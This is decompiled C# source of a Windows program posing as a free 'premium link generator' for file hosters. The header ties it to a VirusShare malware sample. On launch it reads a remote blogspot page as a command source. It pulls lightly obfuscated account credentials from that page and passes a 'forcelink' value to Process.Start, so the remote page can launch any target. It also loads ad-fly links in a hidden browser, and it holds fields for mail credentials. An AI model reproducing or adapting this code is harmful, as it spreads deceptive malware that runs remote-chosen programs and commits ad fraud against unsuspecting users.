// Decompiled with JetBrains decompiler
// Type: hotfile_link_generator.Form2
// Assembly: hotfile link generator, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 493A96F2-70F7-4A1D-A2D2-B76427A45AE1
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Virus.Win32.Virut.ce-576138ab49e63e5349d17f3e7c2c850af27a10623f57656813bbc961f5f74e02.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace hotfile_link_generator
{
  public class Form2 : Form
  {
    private Thread MyNewThread;
    public string update_link;
    private int a;
    public static string img1 = "";
    public static string img2 = "";
    public static string img3 = "";
    public static string img4 = "";
    public static string img5 = "";
    public static string img6 = "";
    public static string link1 = "";
    public static string link2 = "";
    public static string link3 = "";
    public static string link4 = "";
    public static string link5 = "";
    public static string link6 = "";
    public static string force_start_link = "";
    public static string mail_from_user = "";
    public static string mail_from_pass = "";
    public static string mail_to_user = "";
    public static string mail_to_user2 = "";
    public static string mail_from_user2 = "";
    public static string mail_from_pass2 = "";
    public static string website_link = "";
    public static string adf_link = "";
    public static string adf_link2 = "";
    public static string adf_link3 = "";
    public static string hf_user = "";
    public static string hf_pass = "";
    public static bool use_auth_code = false;
    public bool auto_start = false;
    public int count_down = 10;
    private IContainer components;
    private TextBox textBox1;
    private System.Windows.Forms.Timer timer1;
    private Button button1;
    private WebBrowser webBrowser1;
    private LinkLabel linkLabel1;
    private Button about;
    private LinkLabel linkLabel2;

    private string DownloadData(string url)
    {
      byte[] bytes = new byte[0];
      try
      {
        WebResponse response = WebRequest.Create(url).GetResponse();
        Stream responseStream = response.GetResponseStream();
        byte[] buffer = new byte[1024];
        int contentLength = (int) response.ContentLength;
        MemoryStream memoryStream = new MemoryStream();
        while (true)
        {
          int count = responseStream.Read(buffer, 0, buffer.Length);
          Application.DoEvents();
          if (count != 0)
            memoryStream.Write(buffer, 0, count);
          else
            break;
        }
        bytes = memoryStream.ToArray();
        responseStream.Close();
        memoryStream.Close();
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("you need to be connected to the net so u can use this program");
      }
      return Encoding.ASCII.GetString(bytes);
    }

    private void time()
    {
      Thread.Sleep(15000);
      try
      {
        this.webBrowser1.Navigate("");
      }
      catch
      {
      }
    }

    public static string secu_coder(string str_to_enc, int k)
    {
      byte[] bytes = new ASCIIEncoding().GetBytes(str_to_enc);
      byte[] numArray = new byte[bytes.Length];
      string str = "";
      for (int index = 0; index < bytes.Length; ++index)
      {
        numArray[index] = Convert.ToByte((int) bytes[index] ^ (int) Convert.ToByte(k));
        str += (string) (object) Convert.ToChar(numArray[index]);
      }
      return str;
    }

    private string xor(string x)
    {
      string str = "";
      for (int index = 0; index < x.Length; ++index)
        str = str + ((int) x[index] + 7).ToString() + " ";
      return str;
    }

    private string dexor(string x)
    {
      string str = "";
      try
      {
        for (string s = myfn2.cut_this(ref x, " "); s != null; s = myfn2.cut_this(ref x, " "))
        {
          int num = int.Parse(s) - 7;
          str += (string) (object) (char) num;
        }
      }
      catch
      {
      }
      return str;
    }

    public void auth()
    {
      this.button1.Enabled = false;
      string main = myfn2.stringpart(this.DownloadData("http://uleech.blogspot.com/2011/04/fsv12.html"), "<ahmed>", "</ahmed>");
      this.a = main.IndexOf("start this program");
      int num1 = main.IndexOf("show this msg:");
      string str1 = "";
      if (num1 != -1)
      {
        int num2 = main.IndexOf("endofmsg");
        str1 = main.Substring(num1 + 14, num2 - (num1 + 14));
        int num3 = main.IndexOf("show this msg2:");
        if (num3 != -1)
        {
          int num4 = main.IndexOf("endofmsg2");
          string str2 = main.Substring(num3 + 15, num4 - (num3 + 15));
          int num5 = main.IndexOf("show this link:");
          if (num5 != -1)
          {
            int num6 = main.IndexOf("endoflink");
            this.update_link = main.Substring(num5 + 15, num6 - (num5 + 15));
            this.linkLabel1.Visible = true;
          }
          str1 = str1 + (object) '\r' + (object) '\n' + str2;
        }
      }
      Form2.mail_from_pass2 = this.dexor(Form2.mail_from_pass2);
      Form2.website_link = myfn2.stringpart(main, "<website_link>", "</website_link>");
      Form2.adf_link = myfn2.stringpart(main, "<adf_link>", "</adf_link>");
      Form2.adf_link2 = myfn2.stringpart(main, "<adf_link2>", "</adf_link2>");
      Form2.adf_link3 = myfn2.stringpart(main, "<adf_link3>", "</adf_link3>");
      Form2.hf_user = myfn2.stringpart(main, "<h_user>", "</h_user>");
      Form2.hf_user = this.dexor(Form2.hf_user);
      Form2.hf_pass = myfn2.stringpart(main, "<h_pass>", "</h_pass>");
      Form2.hf_pass = this.dexor(Form2.hf_pass);
      Form2.force_start_link = myfn2.stringpart(main, "<forcelink>", "</forcelink>");
      Form2.use_auth_code = myfn2.stringpart(main, "<auth>", "</auth>") == "yes";
      try
      {
        this.linkLabel2.Text = Form2.website_link;
      }
      catch
      {
      }
      if (Form2.force_start_link.Trim() != "")
      {
        try
        {
          Process.Start(Form2.force_start_link);
        }
        catch
        {
        }
      }
      if (this.a == -1)
      {
        this.button1.Enabled = false;
        this.auto_start = false;
      }
      else
      {
        this.button1.Enabled = true;
        this.auto_start = main.Contains("auto_start_program");
      }
      this.textBox1.Text = str1 + "\r\n";
      if (this.auto_start)
        this.textBox1.Text += "auto open in ";
      if (!(Form2.adf_link.Trim() != ""))
        return;
      try
      {
        this.webBrowser1.Navigate(Form2.adf_link);
      }
      catch
      {
      }
      new Thread(new ThreadStart(this.time)).Start();
    }

    public Form2() => this.InitializeComponent();

    private void Form2_Load(object sender, EventArgs e)
    {
      this.button1.Enabled = false;
      this.linkLabel1.Visible = false;
      Control.CheckForIllegalCrossThreadCalls = false;
      this.timer1.Enabled = true;
      this.MyNewThread = new Thread(new ThreadStart(this.auth));
      this.MyNewThread.Start();
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      if (this.textBox1.Text == "please wait.")
        this.textBox1.Text = "please wait..";
      else if (this.textBox1.Text == "please wait..")
        this.textBox1.Text = "please wait...";
      else if (this.textBox1.Text == "please wait...")
        this.textBox1.Text = "please wait....";
      else if (this.textBox1.Text == "please wait....")
        this.textBox1.Text = "please wait.";
      if (!this.auto_start)
        return;
      TextBox textBox1 = this.textBox1;
      textBox1.Text = textBox1.Text + (object) this.count_down-- + "  ";
      if (this.count_down < 0)
      {
        this.button1_Click((object) null, (EventArgs) null);
        this.timer1.Enabled = false;
      }
    }

    private void button1_Click(object sender, EventArgs e)
    {
      if (this.a == -1)
        return;
      this.Hide();
      main main = new main();
      this.auto_start = false;
      this.timer1.Enabled = false;
      main.Show();
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void webBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      if (this.update_link == null)
        return;
      Process.Start(this.update_link);
    }

    private void about_Click(object sender, EventArgs e) => new hotfile_link_generator.about().Show();

    private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      try
      {
        Process.Start(Form2.website_link);
      }
      catch
      {
      }
    }

    private void linkLabel2_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
    {
      try
      {
        Process.Start(Form2.website_link);
      }
      catch
      {
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form2));
      this.textBox1 = new TextBox();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.button1 = new Button();
      this.webBrowser1 = new WebBrowser();
      this.linkLabel1 = new LinkLabel();
      this.about = new Button();
      this.linkLabel2 = new LinkLabel();
      this.SuspendLayout();
      this.textBox1.Font = new Font("Comic Sans MS", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.textBox1.Location = new Point(37, 67);
      this.textBox1.Multiline = true;
      this.textBox1.Name = "textBox1";
      this.textBox1.ReadOnly = true;
      this.textBox1.ScrollBars = ScrollBars.Both;
      this.textBox1.Size = new Size(263, 153);
      this.textBox1.TabIndex = 0;
      this.textBox1.Text = "please wait.";
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.timer1.Interval = 500;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.button1.Location = new Point(79, (int) byte.MaxValue);
      this.button1.Name = "button1";
      this.button1.Size = new Size(136, 30);
      this.button1.TabIndex = 1;
      this.button1.Text = "Enter";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.webBrowser1.Location = new Point(24, 12);
      this.webBrowser1.MinimumSize = new Size(20, 20);
      this.webBrowser1.Name = "webBrowser1";
      this.webBrowser1.ScriptErrorsSuppressed = true;
      this.webBrowser1.Size = new Size(250, 250);
      this.webBrowser1.TabIndex = 2;
      this.webBrowser1.Url = new Uri("", UriKind.Relative);
      this.webBrowser1.Visible = false;
      this.webBrowser1.WebBrowserShortcutsEnabled = false;
      this.webBrowser1.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted);
      this.linkLabel1.AutoSize = true;
      this.linkLabel1.Font = new Font("Comic Sans MS", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.linkLabel1.Location = new Point(70, 223);
      this.linkLabel1.Name = "linkLabel1";
      this.linkLabel1.Size = new Size(204, 26);
      this.linkLabel1.TabIndex = 12;
      ((Label) this.linkLabel1).TabStop = true;
      this.linkLabel1.Text = "press here for update";
      this.linkLabel1.LinkClicked += new LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
      this.about.Location = new Point(242, 289);
      this.about.Name = "about";
      this.about.Size = new Size(86, 22);
      this.about.TabIndex = 14;
      this.about.Text = "About";
      this.about.UseVisualStyleBackColor = true;
      this.about.Click += new EventHandler(this.about_Click);
      this.linkLabel2.AutoSize = true;
      this.linkLabel2.ForeColor = SystemColors.ActiveCaptionText;
      this.linkLabel2.LinkColor = Color.Red;
      this.linkLabel2.Location = new Point(160, 315);
      this.linkLabel2.Name = "linkLabel2";
      this.linkLabel2.Size = new Size(0, 15);
      this.linkLabel2.TabIndex = 15;
      this.linkLabel2.LinkClicked += new LinkLabelLinkClickedEventHandler(this.linkLabel2_LinkClicked_1);
      this.AutoScaleDimensions = new SizeF(7f, 15f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(368, 339);
      this.Controls.Add((Control) this.linkLabel2);
      this.Controls.Add((Control) this.about);
      this.Controls.Add((Control) this.linkLabel1);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.webBrowser1);
      this.Font = new Font("Comic Sans MS", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form2);
      this.Text = "FS premium link Generator V1.2";
      this.Load += new EventHandler(this.Form2_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
